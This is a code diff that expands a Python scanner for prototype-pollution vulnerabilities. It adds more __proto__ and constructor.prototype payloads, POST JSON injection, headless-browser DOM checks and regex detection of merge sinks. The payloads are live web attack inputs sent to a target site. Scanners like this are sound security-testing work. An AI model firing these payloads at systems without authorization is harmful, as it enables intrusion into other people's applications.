@@ -9,38 +9,57 @@ import requests
 from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
 
-# Try importing selenium and handle gracefully if unavailable
 try:
     from selenium import webdriver
     from selenium.webdriver.chrome.options import Options
-    SELENIUM_AVAILABLE = True
 except ModuleNotFoundError:
-    print("[!] Selenium not available. DOM-based tests will be skipped.")
-    SELENIUM_AVAILABLE = False
+    webdriver = None
+    Options = None
+    print("[!] Selenium is not installed. DOM-related features will be disabled.")
 
-# Payloads for prototype pollution
+# Expanded Payloads for prototype pollution
 def get_payloads():
     return [
         {"__proto__": {"isHacked": True}},
         {"constructor": {"prototype": {"polluted": 1}}},
-        {"__proto__": {"admin": True}}
+        {"__proto__": {"admin": True}},
+        {"__proto__.polluted": "yes"},
+        {"__proto__.toString": "polluted"},
+        {"__proto__[test]": "polluted"},
+        {"prototype[polluted]": "yes"},
+        {"__proto__": {"test": "__PP__"}},
     ]
 
 # Set up headless browser for DOM behavior testing
 def setup_browser():
-    if not SELENIUM_AVAILABLE:
+    if webdriver is None or Options is None:
         return None
     chrome_options = Options()
     chrome_options.add_argument("--headless")
     chrome_options.add_argument("--disable-gpu")
     chrome_options.add_argument("--no-sandbox")
-    return webdriver.Chrome(options=chrome_options)
+    try:
+        driver = webdriver.Chrome(options=chrome_options)
+        return driver
+    except Exception as e:
+        print(f"[!] Could not start Chrome WebDriver: {e}")
+        return None
 
 # Inject payload into URL query string
 def inject_payload(base_url, payload):
     for key, val in payload.items():
         full_url = f"{base_url}?{key}={json.dumps(val)}"
         yield full_url
+
+# Inject payload via POST JSON
+def inject_post_payload(session, url, payload):
+    try:
+        headers = {"Content-Type": "application/json"}
+        r = session.post(url, json=payload, headers=headers, timeout=10)
+        return r
+    except Exception as e:
+        print(f"[-] POST injection error at {url}: {e}")
+        return None
 
 # Basic reflection check
 def is_reflected(response_text, payload):
@@ -51,15 +70,15 @@ def is_reflected(response_text, payload):
 
 # Check DOM via headless browser
 def check_dom_effect(driver, url):
-    if not driver:
+    if driver is None:
         return False, None
     try:
         driver.get(url)
         time.sleep(2)
         dom = driver.execute_script("return document.body.innerHTML")
-        if "isHacked" in dom or "polluted" in dom or "admin" in dom:
+        if any(keyword in dom for keyword in ["isHacked", "polluted", "admin", "__PP__"]):
             return True, dom
-    except Exception:
+    except Exception as e:
         return False, None
     return False, None
 
@@ -70,7 +89,7 @@ def extract_js_sinks(session, base_url):
         soup = BeautifulSoup(res.text, "html.parser")
         scripts = soup.find_all("script")
         sink_hits = []
-        pattern = re.compile(r'(Object\\.assign|\\.extend|_.merge)\\s*\\(')
+        pattern = re.compile(r'(Object\\.assign|\\.extend|_\\.merge)\\s*\\(')
 
         for script in scripts:
             if script.get("src"):
@@ -86,7 +105,7 @@ def extract_js_sinks(session, base_url):
                     for match in pattern.finditer(script.string):
                         sink_hits.append((base_url, match.group()))
         return sink_hits
-    except Exception:
+    except Exception as e:
         return []
 
 # Save report as markdown
@@ -103,9 +122,10 @@ def scan(target, results_dir):
     hit_count = 0
 
     for payload in payloads:
+        # GET injection test
         for test_url in inject_payload(target, payload):
             try:
-                print(f"[+] Testing: {test_url}")
+                print(f"[GET] Testing: {test_url}")
                 r = session.get(test_url, timeout=10)
                 reflected, key = is_reflected(r.text, payload)
                 dom_effect, dom_snapshot = check_dom_effect(driver, test_url)
@@ -114,11 +134,12 @@ def scan(target, results_dir):
                 if reflected or dom_effect or sinks:
                     hit_count += 1
                     report.append(f"## Finding {hit_count}")
+                    report.append(f"**Method**: GET")
                     report.append(f"**Tested URL**: `{test_url}`")
                     report.append(f"**Reflected**: `{reflected}` ({key})")
                     report.append(f"**DOM Mutation**: `{dom_effect}`")
                     if dom_snapshot:
-                        dom_file = os.path.join(results_dir, f"dom_snapshot_{hit_count}.html")
+                        dom_file = os.path.join(results_dir, f"dom_snapshot_get_{hit_count}.html")
                         with open(dom_file, "w") as f:
                             f.write(dom_snapshot)
                         report.append(f"**DOM Snapshot Saved**: `{dom_file}`")
@@ -128,11 +149,41 @@ def scan(target, results_dir):
                             report.append(f"- `{match}` in `{js_url}`")
                     report.append("\n")
             except Exception as e:
-                print(f"[-] Error: {e}")
-                continue
+                print(f"[-] Error in GET test: {e}")
+
+        # POST injection test
+        try:
+            print(f"[POST] Testing: {target} with payload {payload}")
+            r_post = inject_post_payload(session, target, payload)
+            if r_post:
+                reflected, key = is_reflected(r_post.text, payload)
+                dom_effect, dom_snapshot = check_dom_effect(driver, target)
+                sinks = extract_js_sinks(session, target)
+
+                if reflected or dom_effect or sinks:
+                    hit_count += 1
+                    report.append(f"## Finding {hit_count}")
+                    report.append(f"**Method**: POST")
+                    report.append(f"**Tested URL**: `{target}`")
+                    report.append(f"**Payload**: `{json.dumps(payload)}`")
+                    report.append(f"**Reflected**: `{reflected}` ({key})")
+                    report.append(f"**DOM Mutation**: `{dom_effect}`")
+                    if dom_snapshot:
+                        dom_file = os.path.join(results_dir, f"dom_snapshot_post_{hit_count}.html")
+                        with open(dom_file, "w") as f:
+                            f.write(dom_snapshot)
+                        report.append(f"**DOM Snapshot Saved**: `{dom_file}`")
+                    if sinks:
+                        report.append("**Sink Matches in JS**:")
+                        for js_url, match in sinks:
+                            report.append(f"- `{match}` in `{js_url}`")
+                    report.append("\n")
+        except Exception as e:
+            print(f"[-] Error in POST test: {e}")
 
     if driver:
         driver.quit()
+
     if hit_count == 0:
         print("[-] No vulnerabilities detected.")
     else:
